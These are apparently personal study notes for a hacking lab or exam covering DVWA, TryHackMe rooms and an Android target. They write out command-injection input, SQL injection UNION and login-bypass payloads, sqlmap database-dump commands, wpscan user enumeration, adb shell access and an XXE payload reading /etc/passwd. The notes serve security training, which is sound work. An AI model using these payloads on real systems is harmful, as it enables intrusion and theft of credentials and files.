@@ -1,0 +1,140 @@
+-------------HACKING WEB & ANROID APPLICATION-----------------------------
+
+#  THINGS WE GET TO LEARN..........
+i> command Injection
+ii> sQLI
+iii> XSS...
+
+# Toolss..........
+
+1. SQLIMAP - for finding SQL Injection Vulnerabilities.
+
+				 *we can use *DVWA site to demonastation.
+
+ *Command injection-
+>login>set it low>command execution>enter an ip add too ping =to get a free ping,we will successfully ping..
+==(from here we get to know that :whatever we will put here as an ip add,it will go in backend it will reflecting back the output) 
+
+*we can also pipe it like, = 8.8.8.8 | pwd (as we do in our terminal,to know our current directory)
+ =================================================================================================================================================================
+ *SQL INJECTION :------------------------------------------------------------------------------------------------------------------------------------------------- 
+ 
+  * SELECT-------------
+
+The first query type we'll learn is the SELECT query used to retrieve data from the database. 
+  >select * from users;
+  >select username,password from users
+  >select * from users LIMIT 1;
+  >select * from users where username='admin';
+  >select * from users where username != 'admin';
+  >select * from users where username='admin' or username='jon';
+  >select * from users where username='admin' and password='p4ssword';
+  >select * from users where username like 'a%'; -This returns any rows with a username beginning with the letter a.
+  > select * from users where username like '%n'; -This returns any rows with a username ending with the letter n.
+  > select * from users where username like '%mi%';-This returns any rows with a username containing the characters mi within them.
+*UNION------------
+  > 1 UNION SELECT 1
+  > 1 UNION SELECT 1,2
+  > 1 UNION SELECT 1,2,3
+  > 0 UNION SELECT 1,2,3
+  > 0 UNION SELECT 1,2,database()
+  > 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' 
+  -Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas.
+  The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables 
+  the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 
+As the first level aims to discover Martin's password, the staff_users table is what interests us. We can utilise the information_schema database again to find the structure of this table using the below query.
+  > 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users' =This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.
+  > 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users =We've also added ,':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.
+  
+			  https://website.thm/analytics?referrer=admin123' UNION SELECT  SLEEP(5), 2 from uers where username like'a%'%' ; --
+  >
+  >
+  >
+  >
+  >> bypass login creds===================
+  >     ' OR 1=1;--'         =because 1=1 is a true statement and we've used an OR operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.
+  >
+  >
+  >
+  >
+select * from users;
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ #command= in terminal >sqlmap -h to find injection in automated way to dump the database 
+  -there are 2 diff aproches -get & post method. --h to get the complete chart.
+  
+  *now back in the site, in sqlinjection tab we will need to put user id,for that we will open <burp suite>
+BURPSUITE -proxy > write smoething in the place of user id in the site, and we will get the traffic in BS.,> go to terminal > sqlmap --url (the sites url with ip) --dbs >this will not work during coockies,,
+so, now we will save the file (in BP) to transfer it in post req. >go to the path in terminal where its saved> sqlmap -r req.txt --dbs (--h to know the details) > it will show the databases > sqlmap -r req.txt -D dvwa  (info about the database)
+ 
+ # to know the tables and the coulums - sqlmap -r req.txt -D dvwa --tables --coulums
+ # to dump it -sqlmap -r req.txt -D dvwa --dump (we will get,us id,avatar,passwords)
+ 
+--------------------------------------------------------
+2. WpScan = for scanning wordpress websites.
+
+ we will use tryhackme room to get the ip & connect to the openvpn.
+# in terminal >  wpscan -h >wpscan --url(of the site,where we going to enum ,here http://10.10.14.187/) --enumerate u(userid,or enter what u want to know)
+
+---------------------------------------------------------
+3.ADB - hacking anroid. (bridges the connection of anroid device  to ur pc)
+ 
+ #in the exam there will bw provided some of ipssss .one of then is actal ip,
+ *commands -adb connect <ip:5555(port no.)> (it will run a anroid listner in anroid, debuggable mode) .
+#in actually hit the command in ur pc > adb devices and if i connec \t the anr device & pc with usb cable to know that what r the devices are available, >then hit the same command 
+=it will connect successfully > adb shell >ls >whoami> cd sdcard/ >find secret file >after getting do >cat secrt.txt >to get the flag.
+
+---------------*
+instalation of DVWA ..
+
+install docker = sudo apt install Docker.io
+>run this command = docker run --rm -it -p 80:80 vulnerables/web-dvwa
+(docker run: Runs a Docker container.
+
+--rm: Removes the container once it stops.
+
+-it: Runs the container in interactive mode with a terminal.
+
+-p 80:80: Maps port 80 of the container to port 80 of your host machine, so you can access the application via your browser.
+
+vulnerables/web-dvwa: Specifies the image you want to run.)sud
+
+ after successfull instalation - write "http://localhost"  it will be started..
+ 
+ now -------command injection-----------
+ 
+ ------------------------------------------------xxe -------------------------------------------
+ 
+## Now we'll see some XXE payload and see how they are working.
+
+1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.
+
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ <userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>
+
+
+As we can see we are defining a ENTITY called name and assigning it a value feast. Later we are using that ENTITY in our code.
+
+2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+
+Here again, we are defining an ENTITY with the name read but the difference is that we are setting it value to `SYSTEM` and path of the file.
+
+If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.
+
+In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.
+
+-----------------------------
